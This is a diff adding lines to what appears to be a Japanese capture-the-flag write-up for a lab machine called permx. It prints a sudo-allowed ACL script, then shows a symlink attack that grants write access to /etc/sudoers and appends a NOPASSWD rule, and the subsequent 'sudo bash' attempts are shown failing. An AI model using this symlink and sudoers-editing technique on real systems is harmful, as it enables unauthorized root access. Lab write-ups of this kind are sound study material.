@@ -405,6 +405,36 @@ User mtz may run the following commands on permx:
     (ALL : ALL) NOPASSWD: /opt/acl.sh
 ```
 
+
+/opt/acl.shを見てみる
+```
+mtz@permx:~$ cat /opt/acl.sh 
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+```
+
+
 ```
 mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/passwd_link
 sudo /opt/acl.sh mtz rw /home/mtz/passwd_link
@@ -459,3 +489,14 @@ lxd:!:19742::::::
 mysql:!:19742:0:99999:7:::
 ```
 
+```
+mtz@permx:~$ ln -s /etc/sudoers root
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
+mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
+mtz@permx:~$ sudo bash
+[sudo] password for mtz: 
+Sorry, user mtz is not allowed to execute '/usr/bin/bash' as root on permx.
+mtz@permx:~$ sudo bash
+[sudo] password for mtz: 
+Sorry, user mtz is not allowed to execute '/usr/bin/bash' as root on permx.
+```
